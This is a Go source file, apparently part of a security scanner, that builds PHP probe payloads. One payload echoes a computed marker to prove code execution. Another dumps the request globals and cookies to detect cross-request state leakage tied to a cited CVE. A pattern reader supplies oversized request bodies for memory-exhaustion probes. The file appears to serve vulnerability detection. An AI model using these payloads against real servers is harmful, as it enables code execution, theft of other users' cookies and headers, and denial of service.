package payload

import (
	"crypto/rand"
	"encoding/hex"
	"io"
)

const MarkerPrefix = "P2S_"

// NewMarker returns a fresh unique marker and a PHP body that proves code
// execution by echoing "<marker>_49" (7*7 evaluated by the PHP engine).
func NewMarker() (marker string, body string) {
	marker = MarkerPrefix + RandomHex(12)
	body = ExecBody(marker)
	return
}

// ExecBody returns the minimal PHP snippet used as the execution probe.
func ExecBody(marker string) string {
	return "<?php echo '" + marker + "_' . (7*7); ?>"
}

// SuccessCheck is the exact string a PHP engine must produce for the marker
// to count as executed code (as opposed to simple reflection of the request).
func SuccessCheck(marker string) string {
	return marker + "_49"
}

// GlobalsDumpBody returns PHP that echoes its own execution proof followed by
// a JSON dump of per-request global state ($_GET/$_POST/$_COOKIE and the
// HTTP_*/PHP_* subset of $_SERVER). A marker planted in request A's query
// string or headers reappearing in this dump is evidence of stale
// request-owned state on the same worker (CVE-2026-109619 channel).
func GlobalsDumpBody(marker string) string {
	return "<?php echo '" + marker + "_' . (7*7); echo '|';" +
		" $s=array();" +
		" foreach ($_SERVER as $k => $v) {" +
		" if (strpos($k,'HTTP_')===0 || strpos($k,'PHP_')===0 || $k==='REQUEST_URI' || $k==='QUERY_STRING')" +
		" { $s[$k]=(string)$v; } }" +
		" echo @json_encode(array('G'=>$_GET,'P'=>$_POST,'C'=>$_COOKIE,'S'=>$s)); ?>"
}

func RandomHex(n int) string {
	b := make([]byte, n)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// PatternReader streams a repeating a..z pattern without allocating the whole
// oversized body in memory (the old OOMProbePayload built a full []byte plus
// a full string copy of it, doubling memory per probe).
type PatternReader struct {
	Remaining int64
	cur       byte
}

func NewPatternReader(n int64) *PatternReader {
	return &PatternReader{Remaining: n, cur: 'a' - 1}
}

func (p *PatternReader) Read(b []byte) (int, error) {
	if p.Remaining <= 0 {
		return 0, io.EOF
	}
	n := int64(len(b))
	if n > p.Remaining {
		n = p.Remaining
	}
	for i := 0; i < int(n); i++ {
		p.cur++
		if p.cur > 'z' {
			p.cur = 'a'
		}
		b[i] = p.cur
	}
	p.Remaining -= n
	return int(n), nil
}
